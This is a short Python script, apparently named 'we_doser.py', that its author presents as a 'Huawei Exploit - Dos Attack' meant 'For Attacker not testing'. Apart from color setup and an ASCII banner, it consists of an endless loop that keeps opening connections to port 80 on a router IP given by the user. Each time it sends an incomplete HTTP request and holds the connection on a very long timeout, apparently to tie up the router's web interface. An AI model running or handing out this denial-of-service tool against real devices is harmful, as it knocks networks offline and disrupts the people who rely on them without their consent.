#!/usr/bin/env python3
import socket,sys,platform,os

# the ip of router (python3 we_doser.py IP)
ip = sys.argv[1] # 192.168.1.1
# EX : $ python3 we_doser.py 192.168.1.1


# colors list
colors = True  # Output should be colored
machine = sys.platform  # Detecting the os of current system
checkplatform = platform.platform() # Get current version of OS
if machine.lower().startswith(('os', 'win', 'darwin', 'ios')):
    colors = False  # Colors shouldn't be displayed in mac & windows
if checkplatform.startswith("Windows-10") and int(platform.version().split(".")[2]) >= 10586:
    colors = True
    os.system('')   # Enables the ANSI
if not colors:
    end = red = white = green = yellow = run = bad = good = bold = info = que = ''
else:
    white = '\033[97m'
    green = '\033[92m'
    red = '\033[91m'
    yellow = '\033[93m'
    end = '\033[0m'
    back = '\033[7;91m'
    bold = '\033[1m'
    blue = '\033[94m'
    info = '\033[93m[!]\033[0m'
    que = '\033[94m[?]\033[0m'
    bad = '\033[91m[-]\033[0m'
    good = '\033[92m[+]\033[0m'
    run = '\033[97m[~]\033[0m'
    grey = '\033[7;90m'
    cyan='\u001B[36m'
    gray = '\033[90m'


# logo
print(r'''
{red}{bold}
\ \    / /__   __| |___ ___ ___ _ _
 \ \/\/ / -_) / _` / _ (_-</ -_) '_|
  \_/\_/\___|_\__,_\___/__/\___|_|
 /         |___|                  \
/                                  \
{yellow}# Coded by : Khaled Nassar @knassar702
{bold}{bad} For Attacker
{red}---------------------------------------
	'''.format(red=red,yellow=yellow,bold=bold,bad=bad))



#####
# Huawei Exploit - Dos Attack
# by : khaled nassar @knassar702
# For Attacker not testing
####
print(f'{bold}{info} Started .!')
while True:
	try:
		s = socket.socket()
		s.connect((ip,80))
		s.settimeout(1000000000)
		s.send(b'GET / HTTP/1.1')
		s.recv(99999999)
		s.close()
		print(f'{bold}{good} Done')
	except KeyboardInterrupt:
		con = input(f"{bold}{info} Stop .? [y]>> ").lower()
		if len(con) > 0:
			if con[0] == 'y':
				print(f'\n\n{bad} Stopped ')
				break
			else:
				print(f'\n\n{info} Continue')
				continue
		else:
			print(f'{info} Continue')
			continue
